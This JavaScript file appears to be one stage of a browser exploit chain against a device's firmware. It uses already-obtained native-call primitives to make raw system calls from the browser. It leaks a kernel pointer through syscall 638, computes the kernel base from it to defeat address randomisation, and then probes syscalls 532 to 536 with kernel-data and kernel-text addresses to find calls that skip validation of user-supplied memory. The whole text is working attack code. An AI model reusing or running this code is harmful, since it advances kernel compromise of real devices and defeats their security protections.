// Lower-range triad: 532 regmgr_call, 533 jitshm_create, 534
// jitshm_alias, 535 dl_get_list, 536 dl_get_info — all located by
// installer v27 (116 wrappers). Hunting the 601 signature across
// four domains per syscall: mapped-user(frame,0x1000), unmapped-user
// (0x700000000000,0x1000), KERNEL_DATA(kbase+0x3AC30DF0,0x1000),
// KERNEL_TEXT(kbase,0x1000). kbase derived at runtime via 638.
// Expected baseline from census: 532/533/534 shapes mostly
// EINVAL/EFAULT (never fully probed); any mu/uu split with kernel-pass
// = missing userspace validation on an ACTIVE service. Markers 5 of 8.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native ||
      typeof native.call !== "function" ||
      typeof native.call64 !== "function" ||
      !native.frame || !Number.isSafeInteger(native.frameAddress) ||
      typeof native.wrappers.sys638 !== "number" ||
      typeof native.wrappers.sys532 !== "number")
    throw new Error("chain_or_call64_missing");
  var frame = native.frame;
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("lt_preflight");
  phase = "derive_kbase";
  var out2Off = 0x1e00, out3Off = 0x1e10;
  var out2Addr = native.frameAddress + out2Off;
  var out3Addr = native.frameAddress + out3Off;
  var fv = new DataView(frame.buffer);
  var o2orig = Array.from(frame.subarray(out2Off, out2Off + 32));
  var c638 = native.call("sys638", [0, out2Addr, out3Addr]);
  if (c638.value !== 0)
    throw new Error("call638_failed");
  var klo = fv.getUint32(out2Off, true);
  var khi = fv.getUint32(out2Off + 4, true);
  var blo = (klo - 0x3B1AABA0) >>> 0;
  var bhi = khi;
  if (klo < 0x3B1AABA0) { blo = (klo - 0x3B1AABA0) >>> 0;
    bhi = (khi - 1) >>> 0; }
  var DOFF = 0x3AC30DF0;
  var dlo = (blo + DOFF) >>> 0;
  var dhi = (bhi + ((blo + DOFF) > 0xffffffff ? 1 : 0)) >>> 0;
  var muArg = [native.frameAddress % 0x100000000,
    Math.floor(native.frameAddress / 0x100000000)];
  var uuArg = [0, 0x7000];
  var kdArg = [dlo, dhi];
  var ktArg = [blo, bhi];
  var lenArg = [0x1000, 0];
  mark("lt_kbase_ok");
  var names = ["sys532", "sys533", "sys534", "sys535", "sys536"];
  var domains = [
    { tag: "mu", arg: muArg },
    { tag: "uu", arg: uuArg },
    { tag: "kd", arg: kdArg },
    { tag: "kt", arg: ktArg }
  ];
  var lines = [];
  for (var i = 0; i < names.length; i++) {
    var name = names[i];
    phase = name;
    if (!native.wrappers[name]) {
      lines.push(name.slice(3) + ":absent");
      continue;
    }
    var line = name.slice(3) + ":";
    for (var d = 0; d < domains.length; d++) {
      var c = native.call64(name, [domains[d].arg, lenArg]);
      var e = (c.value === -1) ? native.readErrno() : null;
      line += domains[d].tag + "(" + c.value + "/" +
        (e === null ? "ok" : e) + ")";
    }
    lines.push(line);
    if (i === 2) mark("lt_half");
  }
  mark("lt_done");
  for (var r = 0; r < 32; r++) frame[out2Off + r] = o2orig[r];
  var after = native.call("getpid", []);
  var linesA = [], linesB = [];
  for (var li = 0; li < lines.length; li++) {
    if (linesA.join(" | ").length + lines[li].length < 440)
      linesA.push(lines[li]);
    else linesB.push(lines[li]);
  }
  result = { id: "lower_triad_v2",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { lines_a: linesA.join(" | "),
      lines_b: linesB.join(" | "),
      pid_ok: after.value === before.value && after.high === 0 } };
} catch (error) {
  result = { id: "lower_triad_v2", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
